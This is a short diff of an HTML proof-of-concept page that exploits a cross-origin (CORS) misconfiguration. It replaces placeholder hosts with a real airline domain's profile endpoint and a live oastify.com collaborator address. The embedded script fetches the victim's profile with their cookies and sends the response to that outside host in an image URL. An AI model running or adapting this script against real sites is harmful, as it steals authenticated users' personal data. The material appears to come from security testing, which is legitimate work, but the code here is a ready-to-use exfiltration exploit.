@@ -6,13 +6,13 @@
 <body>
     <script type="text/javascript">
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', 'http://target-vulnerable-site.com/profile', true);
+        xhr.open('GET', 'http://aeromexico.com/profile/user-profile', true);
         xhr.withCredentials = true;
         xhr.onreadystatechange = function() {
             if (xhr.readyState == 4 && xhr.status == 200) {
                 var data = xhr.responseText;
                 var img = new Image();
-                img.src = 'http://<unique-id>.burpcollaborator.net/log?data=' + encodeURIComponent(data);
+                img.src = 'http://8r0hc2udmxuj75krdv1memf3dujl7f03p.oastify.com/log?data=' + encodeURIComponent(data);
             }
         };
         xhr.send();
